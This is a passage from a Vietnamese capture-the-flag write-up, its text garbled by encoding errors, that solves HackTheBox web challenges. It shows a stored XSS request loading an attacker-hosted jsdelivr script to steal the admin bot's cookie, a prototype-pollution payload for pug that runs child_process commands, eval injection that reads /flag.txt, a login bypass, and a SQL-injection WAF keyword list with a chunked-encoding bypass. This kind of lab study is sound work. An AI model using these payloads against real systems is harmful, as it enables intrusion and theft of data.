<li>C√≥ th·ªÉ th·∫•y l√† thu·ªôc t√≠nh <code> {{ request.halloween_name | safe }}</code> c√≥ th·ªÉ b·ªã XSS v√¨ v·∫≠y ta s·∫Ω l·ª£i d·ª•ng n√≥ ƒë·ªÉ c√≥ th·ªÉ g·ªçi ƒë∆∞·ª£c cookie chuwad token ra b√™n ngo√†i.</li>
<li>ƒê√¢y l√† ph∆∞∆°ng th·ª©c ƒë·ªÉ add th√¥ng tin v√†o database:</li>
</ul>
<pre><code>async party_request_add(halloween_name, email, costume_type, trick_or_treat) {
		return new Promise(async (resolve, reject) =&gt; {
			try {
				let stmt = await this.db.prepare('INSERT INTO party_requests (halloween_name, email, costume_type, trick_or_treat) VALUES (?, ?, ?, ?)');
				resolve((await stmt.run(halloween_name, email, costume_type, trick_or_treat)));
			} catch(e) {
				reject(e);
			}
		});
	}

</code></pre><ul>
<li>n√≥ ƒë∆∞·ª£c s·ª≠ d·ª•ng b·ªõi /api/submit:</li>
</ul>
<pre><code>router.post('/api/submit', (req, res) =&gt; {
    const { halloween_name, email, costume_type, trick_or_treat } = req.body;

    if (halloween_name &amp;&amp; email &amp;&amp; costume_type &amp;&amp; trick_or_treat) {

        return db.party_request_add(halloween_name, email, costume_type, trick_or_treat)
            .then(() =&gt; {
                res.send(response('Your request will be reviewed by our team!'));

                bot.visit();
            })
            .catch(() =&gt; res.send(response('Something Went Wrong!')));
    }

    return res.status(401).send(response('Please fill out all the required fields!'));
});
</code></pre><ul>
<li>Nh·∫≠n c√°c gi√° tr·ªã nh∆∞ n√™u tr√™n say ƒë√≥ th√™m v√†o database n·∫øu ch√∫ng t·ªìn t·∫°i -&gt; g·ªçi bot ƒë·ªÉ cho n√≥ ƒëi ƒë·∫øn admin view</li>
</ul>
<h3 id="flow">Flow</h3>
<ul>
<li>
<p>T·∫°o XSS v·ªõi gi√° tr·ªã c·ªßa  {{ request.halloween_name | safe }} cho l∆∞u v√†o database sau ƒë√≥ bot s·∫Ω ƒë·∫øn admin.html v√† trang n√†y hi·ªÉn th·ªã payload XSS ƒë∆∞·ª£c l∆∞u v√†o db c·ªßa ta -&gt; th·ª±c hi·ªán g·ªçi cookie c·ªßa bot ra ngo√†i v√† l·∫•y c·ªù v·ªõi jwt.io.</p>
</li>
<li>
<p>Nh∆∞ng v·∫•n ƒë·ªÅ l·ªõn nh·∫•t ·ªü ƒë√¢y l√† CSP:</p>
</li>
</ul>
<pre><code>app.use(function (req, res, next) {
    res.setHeader(
        &quot;Content-Security-Policy&quot;,
        &quot;script-src 'self' https://cdn.jsdelivr.net ; style-src 'self' https://fonts.googleapis.com; img-src 'self'; font-src 'self' https://fonts.gstatic.com; child-src 'self'; frame-src 'self'; worker-src 'self'; frame-ancestors 'self'; form-action 'self'; base-uri 'self'; manifest-src 'self'&quot;
    );
    next();
});
</code></pre><ul>
<li>Nh∆∞ng c√≥ m·ªôt ch·ªó c√≥ th·ªÉ l·ª£i d·ª•ng ·ªü ƒë√¢y l√† script cho ph√©p ngu·ªìn t·ª´ <code>https://cdn.jsdelivr.net</code> m√† ta c√≥ th·ªÉ control ƒë∆∞·ª£c ·ªü ƒë√¢y -&gt; t·∫°o payload xss -&gt; t·∫°o th·∫ª <!-- raw HTML omitted --><!-- raw HTML omitted --></li>
<li>V√† cu·ªëi c√πng ch·ªâ c·∫ßn ƒë·ª£i bot call gi√° tr·ªã ra th√¥i.</li>
<li>C√≥ th·ªÉ d√πng trang web n√†y post js c·ªßa m√¨nh l√™n v√πng nh·ªõ c·ªßa <a href="https://cdn.jsdelivr.net">https://cdn.jsdelivr.net</a></li>
</ul>
<p><a href="https://www.jsdelivr.com/github">https://www.jsdelivr.com/github</a></p>
<p><img src="https://hackmd.io/_uploads/H1rnfPJIC.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/SJy0GvJ8R.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/SydxQvJUR.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/BJpIQPyUR.png" alt="image"></p>
<pre><code>POST /api/submit HTTP/1.1
Host: 94.237.54.176:47791
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://94.237.54.176:47791/
Content-Type: application/json
Content-Length: 183
Origin: http://94.237.54.176:47791
Connection: close
Priority: u=1

{&quot;halloween_name&quot;:&quot;&lt;script src=\&quot;https://cdn.jsdelivr.net/gh/l3mnt2010/jsdelivr@main/index.js\&quot;&gt;&lt;/script&gt;&quot;,&quot;email&quot;:&quot;hihi@gmail.com&quot;,&quot;costume_type&quot;:&quot;monster&quot;,&quot;trick_or_treat&quot;:&quot;tricks&quot;}
</code></pre><p><img src="https://hackmd.io/_uploads/Byq_QDk80.png" alt="image"></p>
<p><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwidXNlcl9yb2xlIjoiYWRtaW4iLCJmbGFnIjoiSFRCe2Qwbid0XzRsbDB3X2Nkbl8xbl9jNXAhIX0iLCJpYXQiOjE3MTg3Mzk3ODB9.dzm05GgI5Sjx73YeH7VIFXrOpG8cfd6gnBbo3oProyE</code></p>
<p><img src="https://hackmd.io/_uploads/ry59XvJLR.png" alt="image"></p>
<p>flag : <code>HTB{d0n't_4ll0w_cdn_1n_c5p!!}</code></p>
<h2 id="gunship">Gunship</h2>
<ul>
<li>M·ªôt chall v·ªõi nodejs:</li>
</ul>
<pre><code>
const express       = require('express');
const app           = express();
const routes        = require('./routes');
const path          = require('path');

app.use(express.json());
app.set('views','./views');
app.use('/static', express.static(path.resolve('static')));

app.use(routes);

app.all('*', (req, res) =&gt; {
    return res.status(404).send('404 page not found');
});

app.listen(1337, () =&gt; console.log('Listening on port 1337'));
</code></pre><ul>
<li>Quan s√°t c√°c route:</li>
</ul>
<pre><code>const path              = require('path');
const express           = require('express');
const pug        		= require('pug');
const { unflatten }     = require('flat');
const router            = express.Router();

router.get('/', (req, res) =&gt; {
    return res.sendFile(path.resolve('views/index.html'));
});

router.post('/api/submit', (req, res) =&gt; {
    const { artist } = unflatten(req.body);

	if (artist.name.includes('Haigh') || artist.name.includes('Westaway') || artist.name.includes('Gingell')) {
		return res.json({
			'response': pug.compile('span Hello #{user}, thank you for letting us know!')({ user: 'guest' })
		});
	} else {
		return res.json({
			'response': 'Please provide us with the full name of an existing member.'
		});
	}
});

module.exports = router;
</code></pre><ul>
<li>Server s·ª≠ d·ª•ng template pugjs v√† <code>flat</code> d√πng ƒë·ªÉ decode body, c√≥ duy nh·∫•t api n√†y:</li>
</ul>
<pre><code>router.post('/api/submit', (req, res) =&gt; {
    const { artist } = unflatten(req.body);

	if (artist.name.includes('Haigh') || artist.name.includes('Westaway') || artist.name.includes('Gingell')) {
		return res.json({
			'response': pug.compile('span Hello #{user}, thank you for letting us know!')({ user: 'guest' })
		});
	} else {
		return res.json({
			'response': 'Please provide us with the full name of an existing member.'
		});
	}
});
</code></pre><ul>
<li>server nh·∫≠n <code>artist</code> t·ª´ body ƒë∆∞·ª£c qua <code>unflatten(req.body)</code> sau ƒë√≥ check n·∫øu c√≥ <code>Haigh</code> <code>Westaway</code> <code>Gingell</code> trong artist th√¨ s·∫Ω hi·ªÉn th·ªã th√¥ng b√°o user v·ªõi pugjs n·∫øu kh√¥ng th√¨ y√™u c·∫ßu cung c·∫•p t·ª´ c√≥ ch·ª©a 1 trong 3 k√≠ t·ª±.</li>
<li>Searching flat b·∫£n <code>5.0.0</code> :</li>
</ul>
<p><img src="https://hackmd.io/_uploads/HJgLSwJU0.png" alt="image"></p>
<p>M·ªôt cve critical v·ªõi ƒë√∫ng version &lt; 5.0.1 b·ªã d√≠nh prototype polution lu√¥n.</p>
<ul>
<li>`var unflatten = require(&lsquo;flat&rsquo;).unflatten;</li>
</ul>
<p>unflatten({
&lsquo;<strong>proto</strong>.polluted&rsquo;: true
});</p>
<p>console.log(polluted); // true`</p>
<ul>
<li>
<p>V·∫•n ƒë·ªÅ ·ªü ƒë√¢y l√† ph·∫£i RCE ƒë·ªÉ l·∫•y ƒë∆∞·ª£c flag do ƒë√≥ ta seaching bug c·ªßa pugjs th·ª≠:</p>
</li>
<li>
<p>Ti·∫øp t·ª•c l√† m·ªôt l·ªó h·ªïng RCE ƒë√∫ng nh∆∞ √Ω ta:</p>
</li>
</ul>
<p><img src="https://hackmd.io/_uploads/HyYb8PyUC.png" alt="image"></p>
<p>POC c·ªßa pug:</p>
<p><code>http://localhost:5000/?p=');process.mainModule.constructor._load('child_process').exec('whoami');_=('</code></p>
<ul>
<li>B√¢y gi·ªù ta s·∫Ω l√†m Prototype polution ƒë·ªÉ rce ƒë∆∞·ª£c n√≥.</li>
</ul>
<pre><code>
	{
			&quot;artist.name&quot;:&quot;Haigh&quot;,&quot;__proto__.block&quot;: {
	        &quot;type&quot;: &quot;Text&quot;, 
	        &quot;line&quot;: &quot;process.mainModule.require('child_process').execSync('')&quot;
		    }
		}
</code></pre><p><img src="https://hackmd.io/_uploads/rk3XKQlL0.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/SJbCK7e8C.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/B1qkq7lUA.png" alt="image"></p>
<p>flag : <code>HTB{wh3n_lif3_g1v3s_y0u_p6_st4rT_p0llut1ng_w1th_styl3!!}</code></p>
<h1 id="easy">easy</h1>
<h2 id="jscalc">jscalc</h2>
<p><img src="https://hackmd.io/_uploads/ByYoi7x8R.png" alt="image"></p>
<ul>
<li>M·ªôt chall nodejs:</li>
</ul>
<pre><code>const express       = require('express');
const app           = express();
const bodyParser    = require('body-parser');
const routes        = require('./routes');
const path          = require('path');

app.use(bodyParser.json());

app.set('views', './views');
app.use('/static', express.static(path.resolve('static')));

app.use(routes);

app.all('*', (req, res) =&gt; {
    return res.status(404).send({
        message: '404 page not found'
    });
});

app.listen(1337, () =&gt; console.log('Listening on port 1337'));
</code></pre><ul>
<li>C√≥ m·ªôt route ch√≠nh nh∆∞ sau:</li>
</ul>
<pre><code>const path       = require('path');
const express    = require('express');
const router     = express.Router();
const Calculator = require('../helpers/calculatorHelper');

const response = data =&gt; ({ message: data });

router.get('/', (req, res) =&gt; {
	return res.sendFile(path.resolve('views/index.html'));
});

router.post('/api/calculate', (req, res) =&gt; {
	let { formula } = req.body;

	if (formula) {
		result = Calculator.calculate(formula);
		return res.send(response(result));
	}

	return res.send(response('Missing parameters'));
})

module.exports = router;

// ocd
</code></pre><ul>
<li>api/calculate s·∫Ω nh·∫≠n <code>formula</code> sau ƒë√≥ g·ªçi ph∆∞∆°ng th·ª©c <code>Calculator.calculate(formula);</code> v√† tr·∫£ ra k·∫øt qu·∫£ ph√©p t√≠nh:</li>
</ul>
<pre><code>module.exports = {
    calculate(formula) {
        try {
            return eval(`(function() { return ${ formula } ;}())`);

        } catch (e) {
            if (e instanceof SyntaxError) {
                return 'Something went wrong!';
            }
        }
    }
}


// ocd
</code></pre><ul>
<li>
<p>C√≥ th·ªÉ th·∫•y ch√≠nh x√°c ·ªü ƒë√¢y d√πng eval ƒë·ªÉ th·ª±c hi·ªán ph√©p t√≠nh -&gt; l·ª£i d·ª•ng ƒë·ªÉ RCE.</p>
</li>
<li>
<p>Flag n·∫±m ·ªü root cho n√™n ta c·∫ßn ph·∫£i RCE:</p>
</li>
</ul>
<pre><code>FROM node:alpine

# Install packages
RUN apk add --update --no-cache supervisor g++ make python3

# Setup app
RUN mkdir -p /app

# Add application
WORKDIR /app
COPY challenge .

# Add flag
COPY flag.txt /

# Install dependencies
RUN npm install

# Setup superivsord
COPY config/supervisord.conf /etc/supervisord.conf

# Expose the port node-js is reachable on
EXPOSE 1337

# Start the node-js application
CMD [&quot;/usr/bin/supervisord&quot;, &quot;-c&quot;, &quot;/etc/supervisord.conf&quot;]
</code></pre><ul>
<li>·ªü ƒë√¢y m√¨nh s·∫Ω s·ª≠ d·ª•ng fs ƒë·ªÉ ƒë·ªçc:</li>
</ul>
<p><code>require('fs').readFileSync('/flag.txt', 'utf8')</code></p>
<p><img src="https://hackmd.io/_uploads/HkJ237lUC.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/ByrahXgUR.png" alt="image"></p>
<p>flag : <code>HTB{c4lcul4t3d_my_w4y_thr0ugh_rc3}</code></p>
<h2 id="insomnia">Insomnia</h2>
<ul>
<li>M·ªôt chall s·ª≠ d·ª•ng source php kh√° l√† ph·ª©c t·∫°p:</li>
</ul>
<p><img src="https://hackmd.io/_uploads/BJ0mO4gLC.png" alt="image"></p>
<ul>
<li>Ch∆∞∆°ng tr√¨nh c√≥ ch·ª©c nƒÉng ƒëƒÉng k√≠ ƒëƒÉng nh·∫≠p sau ƒë√≥ ƒë∆∞·ª£c chuy·ªÉn ƒë·∫øn profile c·ªßa ng∆∞·ªùi d√πng.</li>
</ul>
<pre><code>&lt;?php

namespace App\Controllers;

use App\Controllers\BaseController;
use CodeIgniter\HTTP\ResponseInterface;
use Config\Paths;
use Firebase\JWT\JWT;
use Firebase\JWT\Key;

class ProfileController extends BaseController
{
    public function index()
    {
        $token = (string) $_COOKIE[&quot;token&quot;] ?? null;
        $flag = file_get_contents(APPPATH . &quot;/../flag.txt&quot;);
        if (isset($token)) {
            $key = (string) getenv(&quot;JWT_SECRET&quot;);
            $jwt_decode = JWT::decode($token, new Key($key, &quot;HS256&quot;));
            $username = $jwt_decode-&gt;username;
            if ($username == &quot;administrator&quot;) {
                return view(&quot;ProfilePage&quot;, [
                    &quot;username&quot; =&gt; $username,
                    &quot;content&quot; =&gt; $flag,
                ]);
            } else {
                $content = &quot;Haven't seen you for a while&quot;;
                return view(&quot;ProfilePage&quot;, [
                    &quot;username&quot; =&gt; $username,
                    &quot;content&quot; =&gt; $content,
                ]);
            }
        }
    }
}

</code></pre><ul>
<li>
<p>ƒê√¢y l√† n∆°i hi·ªÉn th·ªã th√¥ng tin c·ªßa ng∆∞·ªùi d√πng ƒë√≥ l√† trang profile m√† ta nh·∫Øc ƒë·∫øn ·ªü tr√™n n·∫øu m√† ng∆∞·ªùi d√πng c√≥ username l√† <code>administrator</code> th√¨ s·∫Ω tr·∫£ ra flag c√≤n n·∫øu m√† kh√¥ng ph·∫£i th√¨ ch·ªâ tr·∫£ ra <code>Haven't seen you for a while</code> -&gt; ta c·∫ßn leo quy·ªÅn l√™n admin ƒë·ªÉ ƒë·∫°t ƒë∆∞·ª£c m·ª•c ƒë√≠ch.</p>
</li>
<li>
<p>Nh∆∞ ta c√≥ th·ªÉ th·∫•y th√¨ ·ªü ƒë√¢y ƒë√≥ ch√≠nh l√† ph·∫ßn userController c≈©ng ch√≠nh l√† logic m√† ch√∫ng ta s·ª≠ d·ª•ng ƒë·ªÉ ƒëƒÉng nh·∫≠p / ƒëƒÉng k√≠.</p>
</li>
</ul>
<pre><code>&lt;?php

namespace App\Controllers;

use CodeIgniter\Controller;
use CodeIgniter\API\ResponseTrait;
use Firebase\JWT\JWT;
use Firebase\JWT\Key;

class UserController extends Controller
{
    use ResponseTrait;

    public function LoginIndex()
    {
        return View(&quot;LoginPage&quot;);
    }
    public function login()
    {
        $db = db_connect();
        $json_data = request()-&gt;getJSON(true);
        if (!count($json_data) == 2) {
            return $this-&gt;respond(&quot;Please provide username and password&quot;, 404);
        }
        $query = $db-&gt;table(&quot;users&quot;)-&gt;getWhere($json_data, 1, 0);
        $result = $query-&gt;getRowArray();
        if (!$result) {
            return $this-&gt;respond(&quot;User not found&quot;, 404);
        } else {
            $key = (string) getenv(&quot;JWT_SECRET&quot;);
            $iat = time();
            $exp = $iat + 36000;
            $headers = [
                &quot;alg&quot; =&gt; &quot;HS256&quot;,
                &quot;typ&quot; =&gt; &quot;JWT&quot;,
            ];
            $payload = [
                &quot;iat&quot; =&gt; $iat,
                &quot;exp&quot; =&gt; $exp,
                &quot;username&quot; =&gt; $result[&quot;username&quot;],
            ];
            $token = JWT::encode($payload, $key, &quot;HS256&quot;);

            $response = [
                &quot;message&quot; =&gt; &quot;Login Succesful&quot;,
                &quot;token&quot; =&gt; $token,
            ];
            return $this-&gt;respond($response, 200);
        }
    }

    public function RegisterIndex()
    {
        return View(&quot;RegisterPage&quot;);
    }
    public function register()
    {
        $db = db_connect();
        $json_data = request()-&gt;getJSON(true);
        $username = $json_data[&quot;username&quot;] ?? null;
        $password = $json_data[&quot;password&quot;] ?? null;

        if (!($username &amp;&amp; $password)) {
            return $this-&gt;respond(&quot;Empty username or password&quot;, 404);
        } else {
            // Check if the username already exists
            $existingUser = $db
                -&gt;table(&quot;users&quot;)
                -&gt;where(&quot;username&quot;, $username)
                -&gt;get()
                -&gt;getRow();

            if ($existingUser) {
                return $this-&gt;respond(&quot;Username already exists&quot;, 400);
            }

            // Insert the new user if the username is unique
            $db-&gt;table(&quot;users&quot;)-&gt;insert([
                &quot;username&quot; =&gt; $username,
                &quot;password&quot; =&gt; $password,
            ]);

            if ($db-&gt;affectedRows() &gt; 0) {
                return $this-&gt;respond(
                    &quot;Registration successful for user: &quot; . $username,
                    200
                );
            } else {
                return $this-&gt;respond(&quot;Registration failed&quot;, 404);
            }
        }
    }
}

</code></pre><ul>
<li>ƒê·∫ßu ti√™n m√¨nh s·∫Ω n√≥i v·ªÅ ch·ª©c nƒÉng ƒëƒÉng k√≠ tr∆∞·ªõc:</li>
<li>Sau khi connect database th√¨ server s·∫Ω nh·∫≠n 2 parameter t·ª´ client d∆∞·ªõi d·∫°ng json ƒë√≥ l√† username v√† password -&gt; th·ª±c hi·ªán check t√™n username c√≥ trong db hay ch∆∞a n·∫øu c√≥ th√¨ tr·∫£ ra content l√† ng∆∞·ªùi d√πng ƒë√£ t·ªìn t·∫°i -&gt; n·∫øu ch∆∞a c√≥ th√¨ th·ª±c hi·ªán insert d·ªØ li·ªáu v√†o db :</li>
</ul>
<pre><code>$db-&gt;table(&quot;users&quot;)-&gt;insert([
                &quot;username&quot; =&gt; $username,
                &quot;password&quot; =&gt; $password,
            ]);
</code></pre><ul>
<li>ƒê·∫øn v·ªõi ch·ª©c nƒÉng ƒëƒÉng nh·∫≠p c·ªßa ng∆∞·ªùi d√πng -&gt; t∆∞∆°ng t·ª± server c≈©ng s·∫Ω nh·∫≠n d·ªØ li·ªáu d∆∞·ªõi d·∫°ng json t·ª´ ng∆∞·ªùi d√πng sau ƒë√≥ th·ª±c hi·ªán check trong db nh∆∞n bug ·ªü ƒë√¢y l√† ng∆∞·ªùi d√πng kh√¥ng check password c·ªßa user:</li>
</ul>
<pre><code>$query = $db-&gt;table(&quot;users&quot;)-&gt;getWhere($json_data, 1, 0);
        $result = $query-&gt;getRowArray();
</code></pre><ul>
<li>M√† ch·ªâ th·ª±c hi·ªán check username n·∫øu m√† c√≥ th√¨ s·∫Ω th·ª±c hi·ªán t·∫°o token cho user ƒë√≥.</li>
</ul>
<h3 id="access-control-vulnerability">Access control vulnerability</h3>
<ul>
<li>Th·ª±c hi·ªán leo quy·ªÅn l√™n admin :</li>
</ul>
<p><img src="https://hackmd.io/_uploads/BJgbaVxI0.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/rJ8kp4lUC.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/ryYkaVgI0.png" alt="image"></p>
<p>flag : <code>HTB{I_just_want_to_sleep_a_little_bit!!!!!}</code></p>
<h2 id="0xboverchunked">0xBOverchunked</h2>
<ul>
<li>ti·∫øp t·ª•c m·ªôt chall v·ªõi php source:</li>
</ul>
<pre><code>PS D:\ctf_chall\HTBAgain\0xBOverchunked&gt; tree
D:.
‚îú‚îÄ‚îÄ‚îÄchallenge
‚îÇ   ‚îú‚îÄ‚îÄ‚îÄassets
‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ‚îÄimages
‚îÇ   ‚îÇ   ‚îÇ   ‚îî‚îÄ‚îÄ‚îÄposts
‚îÇ   ‚îÇ   ‚îî‚îÄ‚îÄ‚îÄstyles
‚îÇ   ‚îú‚îÄ‚îÄ‚îÄControllers
‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ‚îÄDatabase
‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ‚îÄHandlers
‚îÇ   ‚îÇ   ‚îî‚îÄ‚îÄ‚îÄWAF
‚îÇ   ‚îî‚îÄ‚îÄ‚îÄdb
‚îî‚îÄ‚îÄ‚îÄconf
PS D:\ctf_chall\HTBAgain\0xBOverchunked&gt;

</code></pre><ul>
<li>
<p>C√≥ th·ªÉ th·∫•y ch∆∞∆°ng tr√¨nh vi·∫øt theo m√¥ h√¨nh MVC c∆° b·∫£n -&gt; ƒëi s√¢u v√†o t·ª´ng file c·ªßa ch∆∞∆°ng tr√¨nh.</p>
</li>
<li>
<p>Ch∆∞∆°ng tr√¨nh s·ª≠ d·ª•ng sqlite db + PDO ƒë·ªÅ connect db.</p>
</li>
<li>
<p>·ªü ƒë√¢y ch√∫ng ta ƒë√£ c√≥ 2 method ƒë·ªÉ truy v·∫•n v√†o trong csdl:</p>
</li>
</ul>
<pre><code>&lt;?php
require_once 'Connect.php';

function safequery($pdo, $id)
{
    if ($id == 6)
    {
        die(&quot;You are not allowed to view this post!&quot;);
    }

    $stmt = $pdo-&gt;prepare(&quot;SELECT id, gamename, gamedesc, image FROM posts  WHERE id = ?&quot;);
    $stmt-&gt;execute([$id]);

    $result = $stmt-&gt;fetch(PDO::FETCH_ASSOC);

    return $result;
}

function unsafequery($pdo, $id)
{
    try
    {
        $stmt = $pdo-&gt;query(&quot;SELECT id, gamename, gamedesc, image FROM posts WHERE id = '$id'&quot;);
        $result = $stmt-&gt;fetch(PDO::FETCH_ASSOC);
        return $result;
    }
    catch(Exception $e)
    {
        http_response_code(500);
        echo &quot;Internal Server Error&quot;;
        exit();
    }
}

?&gt;

</code></pre><ul>
<li>Khi build server th√¨ init.sql ch·ª©a flag:</li>
</ul>
<pre><code>CREATE TABLE posts (
  id INTEGER PRIMARY KEY,
  gamename TEXT NOT NULL,
  gamedesc TEXT NOT NULL,
  image BLOB NOT NULL
);

INSERT INTO posts (gamename, gamedesc, image)
VALUES
  ('Pikachu', 'A small, yellow, mouse-like creature with a lightning bolt-shaped tail. Pikachu is one of the most popular and recognizable characters from the Pokemon franchise.', '1.png'),
  ('Pac-Man', 'Pac-Man is a classic arcade game where you control a yellow character and navigate through a maze, eating dots and avoiding ghosts.', '2.png'),
  ('Sonic', 'He is a blue anthropomorphic hedgehog who is known for his incredible speed and his ability to run faster than the speed of sound.', '3.png'),
  ('Super Mario', 'Its me, Mario, an Italian plumber who must save Princess Toadstool from the evil Bowser.', '4.png'),
  ('Donkey Kong', 'Donkey Kong is known for his incredible strength, agility, and his ability to swing from vines and barrels.', '5.png'),
  ('Flag', 'HTB{f4k3_fl4_f0r_t35t1ng}', '6.png');

</code></pre><ul>
<li>
<p>c√≥ m·ªôt b·∫£ng post sau ƒë√≥ c√≥ c√°c b·∫£n ghi nh∆∞ tr√™n ƒë∆∞·ª£c insert v√†o b·∫£ng -&gt; h∆∞·ªõng ƒë·∫øn sqli ƒë·ªÉ l·∫•y flag.</p>
</li>
<li>
<p>ƒê√¢y l√† source ch√≠nh c·ªßa ch∆∞∆°ng tr√¨nh hi·ªÉn th·ªã l√∫c kh·ªüi ƒë·∫ßu:</p>
</li>
</ul>
<pre><code>
&lt;?php
require_once '../Database/Cursor.php';
require_once '../WAF/waf.php';

if (isset($_SERVER[&quot;HTTP_TRANSFER_ENCODING&quot;]) &amp;&amp; $_SERVER[&quot;HTTP_TRANSFER_ENCODING&quot;] == &quot;chunked&quot;)
{
    $search = $_POST['search'];

    $result = unsafequery($pdo, $search);

    if ($result)
    {
        echo &quot;&lt;div class='results'&gt;No post id found.&lt;/div&gt;&quot;;
    }
    else
    {
        http_response_code(500);
        echo &quot;Internal Server Error&quot;;
        exit();
    }

}
else
{
    if ((isset($_POST[&quot;search&quot;])))
    {
        $search = $_POST[&quot;search&quot;];
        if (waf_sql_injection($search))
        {
            $result = safequery($pdo, $search);
            if ($result)
            {
                echo '
                    &lt;div class=&quot;grid-container&quot;&gt;
                    &lt;div class=&quot;grid-item&quot;&gt;
                        &lt;img class=&quot;post-logo&quot; src=&quot;../../assets/images/posts/' . $result[&quot;image&quot;] . '&quot; width=&quot;100&quot;&gt;
                    &lt;/div&gt;
                    &lt;div class=&quot;grid-item&quot;&gt;
                        &lt;p&gt;&lt;font color=&quot;#F44336&quot;&gt;Name&lt;/font&gt;: ' . $result[&quot;gamename&quot;] . '&lt;/p&gt;
                        &lt;p&gt;&lt;font color=&quot;#F44336&quot;&gt;Description&lt;/font&gt;: ' . $result[&quot;gamedesc&quot;] . '&lt;/p&gt;
                    &lt;/div&gt;
                    &lt;/div&gt;';
            }
            else
            {
                echo &quot;&lt;div class='results'&gt;No post id found.&lt;/div&gt;&quot;;
            }
        }
        else
        {
            echo &quot;&lt;div class='results'&gt;SQL Injection attempt identified and prevented by WAF!&lt;/div&gt;&quot;;
        }
    }
    else
    {
        echo &quot;&lt;div class='results'&gt;Unsupported method!&lt;/div&gt;&quot;;
        http_response_code(400);
    }

}

?&gt;

</code></pre><ul>
<li>ƒê·∫ßu ti√™n ta c√≥ m·ªôt if ƒë·ªÉ check header n·∫øu m√† <code>HTTP_TRANSFER_ENCODING</code> t·ªìn t·∫°i v√† gi√° tr·ªã c·ªßa n√≥ l√† <code>chunked</code> sau ƒë√≥ s·∫Ω l·∫•y parameter <code>search</code> t·ª´ method POST -&gt; g·ªçi method <code>unsafequery</code> n·∫øu m√† c√≥ k·∫øt qu·∫£ th√¨ tr·∫£ ra <code>No post id found</code> n·∫øu kh√¥ng th√¨ 500 status</li>
<li>N·∫øu kh√¥ng ph·∫£i chunked th√¨ s·∫Ω th·ª±c hi·ªán :</li>
</ul>
<pre><code>else
{
    if ((isset($_POST[&quot;search&quot;])))
    {
        $search = $_POST[&quot;search&quot;];
        if (waf_sql_injection($search))
        {
            $result = safequery($pdo, $search);
            if ($result)
            {
                echo '
                    &lt;div class=&quot;grid-container&quot;&gt;
                    &lt;div class=&quot;grid-item&quot;&gt;
                        &lt;img class=&quot;post-logo&quot; src=&quot;../../assets/images/posts/' . $result[&quot;image&quot;] . '&quot; width=&quot;100&quot;&gt;
                    &lt;/div&gt;
                    &lt;div class=&quot;grid-item&quot;&gt;
                        &lt;p&gt;&lt;font color=&quot;#F44336&quot;&gt;Name&lt;/font&gt;: ' . $result[&quot;gamename&quot;] . '&lt;/p&gt;
                        &lt;p&gt;&lt;font color=&quot;#F44336&quot;&gt;Description&lt;/font&gt;: ' . $result[&quot;gamedesc&quot;] . '&lt;/p&gt;
                    &lt;/div&gt;
                    &lt;/div&gt;';
            }
            else
            {
                echo &quot;&lt;div class='results'&gt;No post id found.&lt;/div&gt;&quot;;
            }
        }
        else
        {
            echo &quot;&lt;div class='results'&gt;SQL Injection attempt identified and prevented by WAF!&lt;/div&gt;&quot;;
        }
    }
    else
    {
        echo &quot;&lt;div class='results'&gt;Unsupported method!&lt;/div&gt;&quot;;
        http_response_code(400);
    }
</code></pre><ul>
<li>T∆∞∆°ng t·ª± nh∆∞ tr√™n th√¨ v·∫´n l·∫•y param search sau ƒë√≥ tr·∫£i qua waf <code>waf_sql_injection</code> :</li>
</ul>
<pre><code>function waf_sql_injection($input)
{
    $sql_keywords = array(
        'SELECT',
        'INSERT',
        'UPDATE',
        'DELETE',
        'UNION',
        'DROP',
        'TRUNCATE',
        'ALTER',
        'CREATE',
        'FROM',
        'WHERE',
        'GROUP BY',
        'HAVING',
        'ORDER BY',
        'LIMIT',
        'OFFSET',
        'JOIN',
        'ON',
        'SET',
        'VALUES',
        'INDEX',
        'KEY',
        'PRIMARY',
        'FOREIGN',
        'REFERENCES',
        'TABLE',
        'VIEW',
        'AND',
        'OR',
        &quot;'&quot;,
        '&quot;',
        &quot;')&quot;,
        '-- -',
        '#',
        '--',
        '-'
    );

    foreach ($sql_keywords as $keyword)
    {
        if (stripos($input, $keyword) !== false)
        {
            return false;
        }
    }
    return true;
}
</code></pre><ul>
<li>H√†m n√†y s·∫Ω s·ª≠ d·ª•ng v√≤ng l·∫∑p foreach sau ƒë√≥ d√πng strpos ƒë·ªÉ so s√°nh n·∫øu c√≥ b·∫•t k√¨ k√≠ t·ª± n√†o n·∫±m trong search c·ªßa ch√∫ng ta th√¨ s·∫Ω tr·∫£ ra false.</li>
<li>Nh∆∞ ·ªü tr√™n Cursor ch√∫ng ta ƒë√£ n√≥i th√¨ ch·ªâ c√≥ h√†m :</li>
</ul>
<pre><code>
function unsafequery($pdo, $id)
{
    try
    {
        $stmt = $pdo-&gt;query(&quot;SELECT id, gamename, gamedesc, image FROM posts WHERE id = '$id'&quot;);
        $result = $stmt-&gt;fetch(PDO::FETCH_ASSOC);
        return $result;
    }
    catch(Exception $e)
    {
        http_response_code(500);
        echo &quot;Internal Server Error&quot;;
        exit();
    }
}
</code></pre><ul>
<li>D√≠nh sqli v√† n√≥ ƒë∆∞·ª£c s·ª≠ d·ª•ng khi <code>HTTP_TRANSFER_ENCODING</code> l√† <code>chunked</code> th√¨ method n√†y s·∫Ω ƒë∆∞·ª£c g·ªçi v√† b·ªè qua waf lu√¥n -&gt; nh∆∞ng v·∫•n ƒë·ªÅ c·ªßa b√†i n√†y l√† blind.</li>
</ul>
<p><a href="https://kulv.eu/posts/10">https://kulv.eu/posts/10</a></p>
<h2 id="blueprint-heist">Blueprint Heist</h2>
